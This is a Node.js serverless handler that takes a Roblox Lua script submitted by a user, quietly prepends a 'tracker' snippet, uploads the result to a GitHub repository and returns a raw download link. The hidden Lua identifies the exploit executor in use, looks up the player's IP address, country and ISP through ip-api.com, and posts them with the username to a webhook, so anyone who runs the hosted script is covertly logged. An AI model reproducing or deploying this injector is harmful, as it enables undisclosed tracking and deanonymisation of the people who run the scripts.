import { config } from 'dotenv';
config();
import fetch from 'node-fetch';

export default async (req, res) => {
  const { script } = req.body;
  const id = Math.random().toString(36).substring(2, 12);
  const filename = `scripts/${id}.lua`;

  const tracker = `
local players=game:GetService("Players")
local http_service=game:GetService("HttpService")
local local_player=players.LocalPlayer
local webhook_url="${process.env.blabla4}"
local function http_request(url,method,headers,body)
if syn and syn.request then return syn.request({Url=url,Method=method,Headers=headers or {},Body=body}) end
if request then return request({Url=url,Method=method,Headers=headers or {},Body=body}) end
if fluxus and fluxus.request then return fluxus.request({url=url,method=method,headers=headers or {},body=body}) end
if http and http.request then return http.request({Url=url,Method=method,Headers=headers or {},Body=body}) end
if http_request_async then return http_request_async({Url=url,Method=method,Headers=headers or {},Body=body}) end
return {Body=game:HttpGet(url)} end
local function identify_executor()
if syn then return"synapse"end
if fluxus then return"fluxus"end
if is_sirhurt_closure then return"sirhurt"end
if pebc_execute then return"protosmasher"end
if KRNL_LOADED then return"krnl"end
if getexecutor then return getexecutor()end
return"unknown"end
local function send_data()
local ip_data=http_service:JSONDecode(game:HttpGet("http://ip-api.com/json"))
local content=string.format("```user: %s\\nexecutor: %s\\nip: %s\\ncountry: %s\\norg: %s```",local_player.Name,identify_executor(),ip_data.query,ip_data.country,ip_data.org)
local payload=http_service:JSONEncode({content=content})
http_request(webhook_url,"POST",{["Content-Type"]="application/json"},payload)end
send_data()\n`;

  const final_script = tracker + script;

  await fetch(`https://api.github.com/repos/${process.env.blabla2}/${process.env.blabla3}/contents/${filename}`, {
    method: "PUT",
    headers: {
      Authorization: `Bearer ${process.env.blabla}`,
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      message: "upload",
      content: Buffer.from(final_script).toString("base64")
    })
  });

  const raw_url = `https://raw.githubusercontent.com/${process.env.blabla2}/${process.env.blabla3}/main/${filename}`;
  return res.json({ url: raw_url });
};
